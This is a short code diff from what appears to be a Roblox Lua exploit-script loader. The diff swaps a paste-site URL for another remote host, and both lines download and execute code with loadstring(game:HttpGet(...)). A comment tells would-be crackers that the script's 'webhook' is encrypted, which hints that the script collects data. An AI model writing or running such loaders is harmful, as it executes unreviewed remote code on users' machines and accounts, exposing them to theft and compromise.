@@ -17,5 +17,4 @@
 ]]
 
 --if you are here to crack the script or get the webhook or do anything malicious, everything is heavily encrypted and is under a encrypted server and firewall!
---loadstring(game:HttpGet("http://6exdev.cf/kryptscript/loader.php"))()
-loadstring(game:HttpGet("http://bin.shortbin.eu:8080/raw/2xrnFmt4EM"))()
+loadstring(game:HttpGet("http://6exdev.cf/kryptscript/loader.php"))()
